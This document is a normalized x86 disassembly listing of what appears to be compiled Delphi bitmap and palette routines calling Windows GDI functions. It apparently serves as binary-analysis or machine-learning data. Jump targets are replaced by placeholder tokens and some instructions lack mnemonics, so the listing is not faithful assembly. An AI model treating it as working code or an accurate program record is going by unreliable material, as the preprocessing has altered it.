mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_424450
xor edx edx
push ebp
push sub_42640c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_424934
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4186e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4247ac
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_426418
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_424450
xor eax eax
push ebp
push sub_4264f7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_427734
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_426294
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_427834
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_424934
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41864c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4247ac
retn
sub_426508
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_403290
sub_426528
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_426294
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40d070
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_426584
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_422a10
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_426294
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_426294
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_4265d0
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_425434
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_42667f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_42668c
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_4266d8
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_426294
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_424ca0
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_424ca0
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_426d26
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_4026cc
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_426a30
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_424b8c
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_424ca0
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_424ca0
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_424ca0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_424ca0
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_426cd7
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_426cc6
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_426ca4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_424ca0
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_42668c
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4028c8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_425434
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_423fe8
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_416cd4
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_4232e0
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_423fac
call sub_4232e0
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_424bf8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426cab
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_424ca0
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_426c7a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_424ca0
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_4026ec
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_4232e0
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_423fac
call sub_4232e0
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_4232e0
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_423fac
call sub_4232e0
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_424ca0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_403af0
call sub_403af0
jmp r-xdata
sub_426ccd
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_426cdc
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_403a6c
call sub_403ac0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_426d3c
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_426da0
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_426294
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_426f9b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_424ca0
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_424ca0
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_424ca0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_426f53
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_4266d8
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_426fac
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_425e08
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_426504
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_427014
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax esi
call sub_427724
mov eax [ esi + 0x28 ]
call sub_426508
mov eax [ esi + 0x2c ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4188e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_427050
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_427108
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402ca4
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_427994
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_426504
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_426508
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41890c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_427140
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_427724
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4271cf
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_426d3c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_4266d8
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_427994
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4271d4
mov eax [ ebp - 0x8 ]
call sub_422a10
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_403a6c
call sub_403ac0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_427200
push ebx
mov ebx eax
mov eax ebx
call sub_4274f4
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40d070
pop ebx
retn
sub_427230
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_41a8e4
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_427724
lea eax [ ebx + 0x2c ]
call sub_40d070
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_427994
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_4272a4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_424988
mov eax ebx
call sub_427834
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_427630
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_4274e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
